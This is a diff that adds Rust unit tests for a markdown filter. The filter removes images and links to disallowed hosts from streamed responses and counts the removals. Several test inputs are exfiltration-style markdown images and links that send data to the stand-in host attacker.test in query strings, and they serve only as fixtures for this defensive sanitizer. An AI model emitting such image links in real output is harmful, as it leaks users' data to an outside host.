@@ -6,7 +6,8 @@
 
 use std::time::Instant;
 
-use resguardo_proto::{MarkdownFilter, ResponseControls};
+use resguardo_proto::markdown::HOLD_LIMIT;
+use resguardo_proto::{MarkdownFilter, MarkdownState, Removals, ResponseControls};
 
 fn controls() -> ResponseControls {
     ResponseControls::new(true, true, ["docs.example.com".to_owned()])
@@ -284,4 +285,121 @@ fn a_replacement_cannot_put_a_parenthesis_right_after_released_brackets() {
     );
     // Text that was not changed keeps its parentheses.
     assert_eq!(apply("a [1] (b) [c](#d)"), "a [1] (b) [c](#d)");
+}
+
+// --- What the controls removed, for the receipt (ADR 0017) --------------------------------
+
+fn removals(images: u64, links: u64) -> Removals {
+    Removals { images, links }
+}
+
+/// The removals for `text`, checked to be the same when it arrives whole, in two parts
+/// split at every char boundary, and one character at a time.
+fn removed(text: &str) -> Removals {
+    let controls = controls();
+    let (whole_text, whole) = controls.apply_counted(text);
+    for split in (0..=text.len()).filter(|&i| text.is_char_boundary(i)) {
+        let mut filter = MarkdownFilter::new(&controls);
+        let mut out = filter.push(&text[..split]);
+        out.push_str(&filter.push(&text[split..]));
+        out.push_str(&filter.finish());
+        assert_eq!(out, whole_text, "split at {split} of {text:?}");
+        assert_eq!(filter.removed(), whole, "split at {split} of {text:?}");
+    }
+    let mut filter = MarkdownFilter::new(&controls);
+    let mut out = String::new();
+    for c in text.chars() {
+        out.push_str(&filter.push(c.encode_utf8(&mut [0; 4])));
+    }
+    out.push_str(&filter.finish());
+    assert_eq!(out, whole_text, "one character at a time: {text:?}");
+    assert_eq!(filter.removed(), whole, "one character at a time: {text:?}");
+    whole
+}
+
+#[test]
+fn an_untouched_text_removes_nothing() {
+    assert_eq!(
+        removed("hola, sin enlaces ni imágenes"),
+        Removals::default()
+    );
+}
+
+#[test]
+fn one_image_and_one_link_are_counted() {
+    assert_eq!(
+        removed("Hecho ![x](https://attacker.test/p?d=abc) y [aquí](https://attacker.test/)"),
+        removals(1, 1)
+    );
+}
+
+#[test]
+fn an_allowed_link_and_a_local_image_count_nothing() {
+    assert_eq!(
+        removed("[guía](https://docs.example.com/x) ![logo](logo.png) [arriba](#top)"),
+        Removals::default()
+    );
+}
+
+#[test]
+fn an_image_that_never_closes_counts_as_removed() {
+    assert_eq!(
+        removed("ver ![x](https://attacker.test/p?d=abc"),
+        removals(1, 0)
+    );
+}
+
+#[test]
+fn an_image_past_the_hold_limit_counts_once() {
+    let text = format!("![x](https://attacker.test/?d={})", "a".repeat(HOLD_LIMIT));
+    assert_eq!(removed(&text), removals(1, 0));
+}
+
+#[test]
+fn a_tampered_destination_counts_only_what_the_application_sees_removed() {
+    // The link inside each destination is read only to see that the destination is not a
+    // real one; it is not released on its own, so it is not counted.
+    assert_eq!(
+        removed("![x](logo.png[y](https://attacker.test/))"),
+        removals(1, 0)
+    );
+    assert_eq!(removed("[a](x[b](https://attacker.test/))"), removals(0, 1));
+}
+
+#[test]
+fn an_image_inside_a_link_counts_as_one_of_each() {
+    assert_eq!(
+        removed("[![x](https://attacker.test/i.png)](https://attacker.test/l)"),
+        removals(1, 1)
+    );
+}
+
+#[test]
+fn removals_inside_brackets_that_are_not_a_link_count() {
+    assert_eq!(
+        removed("[ver ![x](https://attacker.test/i.png) y [a](https://attacker.test/)]"),
+        removals(1, 1)
+    );
+}
+
+#[test]
+fn an_escaped_placeholder_is_still_one_image() {
+    assert_eq!(
+        removed("![x](https://attacker.test/p)(https://attacker.test/q)"),
+        removals(1, 0)
+    );
+}
+
+#[test]
+fn a_state_per_stream_block_counts_its_own_removals() {
+    let controls = controls();
+    let mut first = MarkdownState::default();
+    let mut second = MarkdownState::default();
+    let _ = controls.push(&mut first, "![x](https://attacker.test/");
+    let _ = controls.push(&mut second, "[a](https://attacker.test/)");
+    let _ = controls.push(&mut first, "p) ok");
+    let _ = controls.finish(&mut first);
+    let _ = controls.finish(&mut second);
+    assert_eq!(first.removed(), removals(1, 0));
+    assert_eq!(second.removed(), removals(0, 1));
 }
